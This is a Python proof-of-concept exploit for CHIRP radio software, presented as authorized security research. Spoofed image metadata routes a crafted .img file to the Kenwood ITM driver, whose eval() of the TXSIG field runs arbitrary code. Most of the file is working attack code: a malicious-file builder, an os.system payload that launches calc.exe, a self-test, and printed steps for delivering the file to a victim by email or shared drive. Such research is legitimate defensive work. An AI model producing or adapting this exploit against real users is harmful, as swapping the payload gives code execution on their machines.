"""
chirp - Metadata-Spoofed .img File Routes to ITM eval() Bypassing Extension Filter POC
=======================================================================================

CHIRP's driver-detection reads every opened file in binary mode and calls
CloneModeRadio._strip_metadata() (chirp_common.py:1588), which searches for the magic
bytes b'\\x00\\xffchirp\\xeeimg\\x00\\x01' in the raw data. If found, the base64-encoded
JSON blob that follows is decoded to extract vendor/model, and get_radio_by_image()
(directory.py:184-215) uses those fields to select a driver -- completely ignoring the
file extension.

An attacker crafts a file with a .img extension (which IS in CHIRP's default "Chirp Image
Files" dialog filter) that embeds {"vendor":"Kenwood","model":"ITM"} metadata. CHIRP routes
the file to ITMRadio, whose load() opens the file in text mode, finds the
"// Conventional Data" CSV section at the top, and calls eval(TXSIG) / eval(RXSIG) via
_clean_tmode() -- executing attacker-controlled code before the text reader reaches the
binary MAGIC trailer at the end of the file.

The victim sees a normal .img file in the default dialog filter; no "All Files" switch is
needed. This is the higher-severity variant of the base ITM eval() bug.

Affected:  chirp (all versions with kenwood_itm driver)
CWE:       CWE-95 (Eval Injection)
CVSS:      7.8 HIGH (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

Vulnerable code:
    chirp/chirp_common.py:1588  _strip_metadata() -- finds MAGIC, decodes vendor/model
    chirp/directory.py:184-215  get_radio_by_image() -- selects driver from metadata
    chirp/drivers/kenwood_itm.py:66-67  _clean_tmode() -- eval(TXSIG) / eval(RXSIG)

Usage:
    python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py
                                   # write evil_chirp.img (opens calc.exe when loaded)
    python poc_...py --output /path/to/file.img
                                   # custom output path
    python poc_...py --selftest    # safe validation: fires eval() via sentinel file

DISCLAIMER: This POC is for authorized security research only.
"""
import argparse
import base64
import json
import os
import sys
import tempfile

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_PRODUCT = "chirp"
CWE = "CWE-95"
CVSS = 7.8

# Path to the CHIRP source tree (used by --selftest to import the live library)
CHIRP_SRC = os.path.join(
    os.path.dirname(__file__), "..", "..", "kk7ds_chirp", "source"
)

# Default output file -- .img is in CHIRP's default "Chirp Image Files (*.img)" filter
OUTPUT_FILE = "evil_chirp.img"

# CHIRP's CloneModeRadio.MAGIC (chirp_common.py:1531)
CHIRP_MAGIC = b'\x00\xffchirp\xeeimg\x00\x01'

# ---------------------------------------------------------------------------
# File builder
# ---------------------------------------------------------------------------

def build_malicious_img(txsig_payload: str) -> bytes:
    """
    Build the malicious .img file.

    Structure:
        [ITM CSV section with eval() payload]  <- ITMRadio.load() parses this in text mode
        [blank line]
        [CHIRP MAGIC bytes]                    <- _strip_metadata() finds this in binary mode
        [base64 JSON: vendor=Kenwood, model=ITM]  <- routes to ITMRadio regardless of ext
    """
    csv_section = (
        "// Conventional Data\r\n"
        "CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG\r\n"
        f"1,0,146520000,146520000,EVIL,{txsig_payload},0\r\n"
        "\r\n"
    ).encode("utf-8")

    metadata = {
        "rclass": "ITMRadio",
        "vendor": "Kenwood",
        "model": "ITM",
        "variant": "",
        "chirp_version": "daily-20230101",
    }
    encoded_meta = base64.b64encode(json.dumps(metadata).encode())

    return csv_section + CHIRP_MAGIC + encoded_meta


# ---------------------------------------------------------------------------
# POC modes
# ---------------------------------------------------------------------------

def run_poc(output: str = OUTPUT_FILE) -> None:
    """Craft and write the malicious .img file with a calc.exe payload."""
    print(f"[*] {TARGET_PRODUCT} -- Metadata-Spoofed .img -> ITM eval() RCE ({CWE}, CVSS {CVSS})")
    print()

    payload = "__import__('os').system('calc.exe')"
    data = build_malicious_img(payload)

    with open(output, "wb") as fh:
        fh.write(data)

    size = os.path.getsize(output)
    print(f"[+] Malicious file written: {output}  ({size} bytes)")
    print()
    print("  File structure (hex-annotated):")
    print("    offset 0              : // Conventional Data  (ITM CSV sentinel)")
    print("    ...                   : CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG")
    print(f"    ...                   : 1,0,146520000,...,{payload},0")
    print(f"    offset {len(data.split(CHIRP_MAGIC)[0])}+        : CHIRP MAGIC  (\\x00\\xffchirp\\xeeimg\\x00\\x01)")
    print("    offset +12            : base64 JSON  {vendor:Kenwood, model:ITM, ...}")
    print()
    print("  Delivery:")
    print(f"    1. Send {output!r} to victim (e.g. email, shared drive)")
    print("    2. Victim opens CHIRP -> File -> Open")
    print('    3. File visible in the DEFAULT "Chirp Image Files (*.img)" filter')
    print("       -- victim does NOT need to switch to 'All Files'")
    print("    4. get_radio_by_image() reads binary, finds MAGIC, decodes metadata")
    print("       -> selects ITMRadio (ignores .img extension)")
    print("    5. ITMRadio.load() opens file in text mode, finds CSV section")
    print("       -> _clean_tmode() calls eval(TXSIG) -> calc.exe launches")


def selftest() -> bool:
    """
    Safe validation: fires eval() via a benign sentinel-file payload.
    Calls ITMRadio.load() directly from the live CHIRP source tree -- no GUI needed.
    """
    print("[*] Self-test mode -- verifying eval() fires via metadata routing")
    print()

    sentinel = os.path.join(tempfile.gettempdir(), "chirp_itm_metaspoof_poc.txt")
    if os.path.exists(sentinel):
        os.remove(sentinel)

    # Payload: write sentinel, return 88.5 (a valid ITM tone value) so load() doesn't choke
    payload = f"[open({sentinel!r}, 'w').write('pwned'), 88.5][-1]"

    with tempfile.NamedTemporaryFile(suffix=".img", delete=False) as tf:
        tmp_path = tf.name
        tf.write(build_malicious_img(payload))

    print(f"  Malicious .img : {tmp_path}")
    print(f"  Sentinel path  : {sentinel}")
    print()

    try:
        chirp_src = os.path.abspath(CHIRP_SRC)
        if chirp_src not in sys.path:
            sys.path.insert(0, chirp_src)

        from chirp import directory
        directory.import_drivers()

        print("[*] Calling get_radio_by_image() ...")
        radio = directory.get_radio_by_image(tmp_path)
        driver_name = radio.__class__.__name__
        print(f"[*] Driver selected: {driver_name}  (VENDOR={radio.VENDOR!r}, MODEL={radio.MODEL!r})")
        print()

        if driver_name != "ITMRadio":
            print(f"[FAIL] Expected ITMRadio, got {driver_name}")
            return False

        print("[*] Calling ITMRadio.load() to trigger eval(TXSIG) ...")
        try:
            radio.load(tmp_path)
        except Exception as exc:
            # Text-mode reader hitting binary MAGIC trailer may raise after eval fires
            print(f"[*] Exception after load (expected -- binary trailer): {exc}")

    finally:
        if os.path.exists(tmp_path):
            os.unlink(tmp_path)

    print()
    if os.path.exists(sentinel):
        print(f"[+] CONFIRMED: sentinel created at {sentinel}")
        print("[+] eval() executed via metadata-spoofed .img -> ITMRadio routing")
        os.remove(sentinel)
        return True
    else:
        print("[FAIL] Sentinel not created -- eval() did not fire")
        return False


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CHIRP metadata-spoofed .img -> ITM eval() RCE POC"
    )
    parser.add_argument(
        "--selftest", action="store_true",
        help="Safe self-test: fire eval() via sentinel file, no GUI needed"
    )
    parser.add_argument(
        "--output", default=OUTPUT_FILE, metavar="FILE",
        help=f"Output .img path (default: {OUTPUT_FILE})"
    )
    args = parser.parse_args()

    if args.selftest:
        ok = selftest()
        sys.exit(0 if ok else 1)
    else:
        run_poc(args.output)
